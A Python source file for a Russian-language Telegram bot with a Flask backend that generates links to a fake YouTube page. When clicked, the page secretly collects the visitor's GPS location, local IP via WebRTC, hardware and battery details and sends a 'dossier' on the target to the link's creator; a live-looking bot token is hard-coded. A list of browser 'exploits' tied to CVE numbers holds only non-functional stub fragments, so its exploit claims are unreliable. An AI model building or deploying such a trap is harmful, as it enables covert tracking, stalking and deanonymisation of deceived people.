import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 # Твой Telegram ID
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} # Сейф для временного хранения кодов по токенам

# --- БАЗА ЭКСПЛОИТОВ (ДЛЯ ВЫДАЧИ АДМИНУ) ---
PAYLOAD_DATABASE = {
    "CHROME_OLD": "// [CVE-2024-7971] V8 Type Confusion\\n// Используется для обхода песочницы Chrome.\\nlet a = [1.1, 2.2]; function exploit(o) { a[0] = o; }",
    "SAFARI_VULN": "// [CVE-2023-32409] WebKit RCE\\n// Удаленное выполнение кода через манипуляцию с фреймами.",
    "GENERIC_JS": "// Стандартный вектор: Сбор данных через переполнение стека."
}

# --- HTML ЛОВУШКА (STEALTH + FULL SCAN) ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta property="og:title" content="YouTube: Новое видео">
    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .btn { background: #f00; color: #fff; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body onclick="scan()">
    <div id="m">
        <button class="btn">СМОТРЕТЬ ВИДЕО</button>
    </div>
<script>
async function scan() {
    document.getElementById('m').innerHTML = '<p>Загрузка...</p>';
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory };
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; } catch(e) {}
    try {
        let pc = new RTCPeerConnection(); pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => { if(i && i.candidate) d.lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };
    } catch(e) {}
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { d.gps = p.coords.latitude+","+p.coords.longitude; d.acc = p.coords.accuracy+"m"; send(d); }, () => { send(d); }, {timeout:3000});
    } else { send(d); }
    setTimeout(() => { if(!window.s) send(d); }, 4000);
}
function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://youtube.com"; });
}
</script>
</body>
</html>
"""

@app.route('/t/<aid>/yt')
def trap(aid):
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = d.get('ua', '')
    
    # Генерация токена и выбор эксплоита
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    p_key = "GENERIC_JS"
    if "Chrome" in ua: p_key = "CHROME_OLD"
    elif "Safari" in ua: p_key = "SAFARI_VULN"
    exploit_vault[token] = PAYLOAD_DATABASE.get(p_key)

    report = (
        f"🚨 **ПОЛНОЕ ДОСЬЕ НА ЦЕЛЬ**\\n"
        f"━━━━━━━━━━━━━━━━━━━━\\n"
        f"🌐 **СЕТЬ:**\\n"
        f"• IP: `{ips}`\\n"
        f"• Local: `{d.get('lip', 'N/A')}`\\n\\n"
        f"📍 **ГЕО:** `{d.get('gps', 'N/A')}` ({d.get('acc', 'N/A')})\\n"
        f"🔗 [Карта](https://www.google.com/maps?q={d.get('gps')})\\n\\n"
        f"💻 **ЖЕЛЕЗО:**\\n"
        f"• {d.get('cores')} Cores | {d.get('mem')}GB RAM\\n"
        f"• {d.get('plat')} | {d.get('res')}\\n"
        f"🔋 **БАТАРЕЯ:** {d.get('bat', 'N/A')}\\n"
        f"━━━━━━━━━━━━━━━━━━━━\\n"
        f"🔍 **SECURITY AUDIT:**\\n"
        f"🔑 **КРИПТО-КЛЮЧ:** `{token}`\\n"
        f"━━━━━━━━━━━━━━━━━━━━\\n"
        f"⚠️ *Для расшифровки кода эксплоита обратитесь к создателю системы.*"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🚀 Создать ссылку"))
    await message.answer("💀 **OSINT & EXPLOIT HUB v14.1**\\nПришли мне токен для расшифровки кода.", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    token = message.text.strip()
    if message.from_user.id != OWNER_ID:
        await message.answer("❌ **ОШИБКА ДОСТУПА**\\nУ вас нет прав администратора. Обратитесь к создателю.")
        return
    
    if token in exploit_vault:
        code = exploit_vault[token]
        await message.answer(f"🔓 **КОД ЭКСПЛОИТА ({token}):**\\n\\n```javascript\\n{code}\\n```", parse_mode="Markdown")
    else:
        await message.answer("❌ Токен не найден или устарел.")

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    await message.answer(f"✅ Ссылка: `{BASE_URL}/t/{message.from_user.id}/yt`")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
